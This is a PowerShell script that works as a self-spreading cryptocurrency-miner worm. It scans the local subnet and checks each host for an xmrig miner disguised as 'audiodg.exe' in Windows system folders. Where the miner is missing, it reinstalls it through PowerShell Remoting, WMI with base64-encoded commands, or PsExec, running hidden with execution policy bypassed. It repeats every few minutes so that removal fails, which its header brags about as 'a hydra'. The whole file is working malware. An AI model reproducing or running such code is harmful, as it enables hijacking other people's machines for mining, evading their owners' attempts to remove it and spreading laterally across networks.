# ================================================================================================
# NETWORK AUTO-REDEPLOY SYSTEM
# ================================================================================================
# If one PC survives, it automatically redeploys to all other PCs
# Like a hydra - cut off one head, two more grow back!
# ================================================================================================

param(
    [string]$DeploymentScript = "$PSScriptRoot\DEPLOY_ULTIMATE.ps1",
    [int]$ScanInterval = 300,  # Scan network every 5 minutes
    [string]$SubnetMask = "192.168.1.0/24"  # Auto-detect if not specified
)

Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "           NETWORK AUTO-REDEPLOY SYSTEM" -ForegroundColor Cyan
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "This PC will automatically redeploy the miner to other PCs" -ForegroundColor Yellow
Write-Host "on the network if they don't have it or it gets removed." -ForegroundColor Yellow
Write-Host ""

# Check if deployment script exists
if (-not (Test-Path $DeploymentScript)) {
    Write-Host "❌ Deployment script not found: $DeploymentScript" -ForegroundColor Red
    exit 1
}

# ================================================================================================
# NETWORK DISCOVERY
# ================================================================================================

function Get-LocalSubnet {
    try {
        $adapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual|Loopback' } | Select-Object -First 1
        if ($adapter) {
            $ipConfig = Get-NetIPAddress -InterfaceIndex $adapter.ifIndex -AddressFamily IPv4
            if ($ipConfig) {
                $ip = $ipConfig.IPAddress
                $prefix = $ipConfig.PrefixLength
                
                # Calculate subnet
                $ipParts = $ip.Split('.')
                $subnet = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2]).0/$prefix"
                
                return $subnet
            }
        }
    } catch {}
    
    return "192.168.1.0/24"  # Default
}

function Get-LivePCs {
    param([string]$Subnet)
    
    Write-Host "🔍 Scanning network for live PCs..." -ForegroundColor Yellow
    
    # Extract base IP and range
    $baseIP = ($Subnet -split '/')[0]
    $ipParts = $baseIP.Split('.')
    $baseNetwork = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2])"
    
    $livePCs = @()
    
    # Fast ping scan (1-254)
    $jobs = @()
    for ($i = 1; $i -le 254; $i++) {
        $ip = "$baseNetwork.$i"
        $jobs += Start-Job -ScriptBlock {
            param($targetIP)
            if (Test-Connection -ComputerName $targetIP -Count 1 -Quiet -TimeoutSeconds 1) {
                try {
                    $hostname = [System.Net.Dns]::GetHostEntry($targetIP).HostName
                    return @{IP = $targetIP; Hostname = $hostname; Online = $true}
                } catch {
                    return @{IP = $targetIP; Hostname = $targetIP; Online = $true}
                }
            }
        } -ArgumentList $ip
    }
    
    # Wait for jobs with timeout
    $jobs | Wait-Job -Timeout 30 | Out-Null
    
    # Get results
    foreach ($job in $jobs) {
        $result = Receive-Job -Job $job -ErrorAction SilentlyContinue
        if ($result -and $result.Online) {
            $livePCs += $result
        }
        Remove-Job -Job $job -Force
    }
    
    Write-Host "  ✅ Found $($livePCs.Count) live PC(s)" -ForegroundColor Green
    
    return $livePCs
}

# ================================================================================================
# DEPLOYMENT CHECK
# ================================================================================================

function Test-MinerInstalled {
    param([string]$ComputerName)
    
    try {
        $session = New-PSSession -ComputerName $ComputerName -ErrorAction Stop
        
        $installed = Invoke-Command -Session $session -ScriptBlock {
            # Check for miner process
            $process = Get-Process -Name audiodg,xmrig -ErrorAction SilentlyContinue | Where-Object {
                $_.CommandLine -match 'config\.json|moneroocean'
            }
            
            if ($process) {
                return $true
            }
            
            # Check for deployment files
            $locations = @(
                "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe",
                "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\audiodg.exe"
            )
            
            foreach ($location in $locations) {
                if (Test-Path $location) {
                    return $true
                }
            }
            
            return $false
        }
        
        Remove-PSSession -Session $session
        return $installed
        
    } catch {
        return $null  # Can't check (no admin access or firewall)
    }
}

# ================================================================================================
# AUTO-DEPLOYMENT
# ================================================================================================

function Deploy-ToPC {
    param(
        [string]$ComputerName,
        [string]$ScriptPath
    )
    
    try {
        Write-Host "  📦 Deploying to: $ComputerName..." -ForegroundColor Cyan
        
        # Method 1: PowerShell Remoting (best)
        try {
            $session = New-PSSession -ComputerName $ComputerName -ErrorAction Stop
            
            # Copy script
            Copy-Item -Path $ScriptPath -Destination "C:\Windows\Temp\deploy.ps1" -ToSession $session -Force
            
            # Execute
            Invoke-Command -Session $session -ScriptBlock {
                Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\deploy.ps1" -WindowStyle Hidden
            }
            
            Remove-PSSession -Session $session
            
            Write-Host "    ✅ Deployed via PS Remoting" -ForegroundColor Green
            return $true
            
        } catch {}
        
        # Method 2: WMI (if PS Remoting fails)
        try {
            $scriptContent = Get-Content $ScriptPath -Raw
            $encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptContent))
            
            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -EncodedCommand $encodedScript" -ComputerName $ComputerName -ErrorAction Stop | Out-Null
            
            Write-Host "    ✅ Deployed via WMI" -ForegroundColor Green
            return $true
            
        } catch {}
        
        # Method 3: PsExec (if available)
        if (Test-Path "$PSScriptRoot\PsExec.exe") {
            try {
                & "$PSScriptRoot\PsExec.exe" -accepteula -d -s \\$ComputerName powershell.exe -ExecutionPolicy Bypass -File $ScriptPath 2>&1 | Out-Null
                
                Write-Host "    ✅ Deployed via PsExec" -ForegroundColor Green
                return $true
                
            } catch {}
        }
        
        Write-Host "    ❌ All deployment methods failed" -ForegroundColor Red
        return $false
        
    } catch {
        Write-Host "    ❌ Deployment failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# ================================================================================================
# MAIN MONITORING LOOP
# ================================================================================================

Write-Host "Starting network monitoring..." -ForegroundColor Green
Write-Host "Scan interval: $ScanInterval seconds" -ForegroundColor Gray
Write-Host ""

$scanCount = 0
$deployCount = 0

while ($true) {
    try {
        $scanCount++
        Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
        Write-Host "SCAN #$scanCount - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Cyan
        Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
        
        # Auto-detect subnet if not specified
        if ($SubnetMask -eq "192.168.1.0/24" -or [string]::IsNullOrEmpty($SubnetMask)) {
            $SubnetMask = Get-LocalSubnet
            Write-Host "Auto-detected subnet: $SubnetMask" -ForegroundColor Gray
        }
        
        # Scan for live PCs
        $livePCs = Get-LivePCs -Subnet $SubnetMask
        
        if ($livePCs.Count -eq 0) {
            Write-Host "⚠️  No PCs found on network" -ForegroundColor Yellow
        } else {
            # Check each PC
            $needsDeployment = @()
            
            foreach ($pc in $livePCs) {
                # Skip this PC
                if ($pc.Hostname -eq $env:COMPUTERNAME -or $pc.IP -eq (Get-NetIPAddress -AddressFamily IPv4 | Select-Object -First 1).IPAddress) {
                    continue
                }
                
                Write-Host "  🔍 Checking: $($pc.Hostname) ($($pc.IP))..." -ForegroundColor Gray -NoNewline
                
                $installed = Test-MinerInstalled -ComputerName $pc.Hostname
                
                if ($installed -eq $true) {
                    Write-Host " ✅ ACTIVE" -ForegroundColor Green
                } elseif ($installed -eq $false) {
                    Write-Host " ❌ MISSING" -ForegroundColor Red
                    $needsDeployment += $pc
                } else {
                    Write-Host " ⚠️  CAN'T CHECK" -ForegroundColor Yellow
                }
            }
            
            # Deploy to PCs that need it
            if ($needsDeployment.Count -gt 0) {
                Write-Host ""
                Write-Host "🚀 AUTO-DEPLOYING to $($needsDeployment.Count) PC(s)..." -ForegroundColor Yellow
                Write-Host ""
                
                foreach ($pc in $needsDeployment) {
                    $success = Deploy-ToPC -ComputerName $pc.Hostname -ScriptPath $DeploymentScript
                    if ($success) {
                        $deployCount++
                    }
                    Start-Sleep -Seconds 2
                }
                
                Write-Host ""
                Write-Host "✅ Deployment round complete" -ForegroundColor Green
                Write-Host "Total deployments: $deployCount" -ForegroundColor Cyan
            } else {
                Write-Host ""
                Write-Host "✅ All PCs have active miners" -ForegroundColor Green
            }
        }
        
        Write-Host ""
        Write-Host "Next scan in $ScanInterval seconds..." -ForegroundColor Gray
        Write-Host ""
        
        Start-Sleep -Seconds $ScanInterval
        
    } catch {
        Write-Host "❌ Error in monitoring loop: $($_.Exception.Message)" -ForegroundColor Red
        Start-Sleep -Seconds 60
    }
}
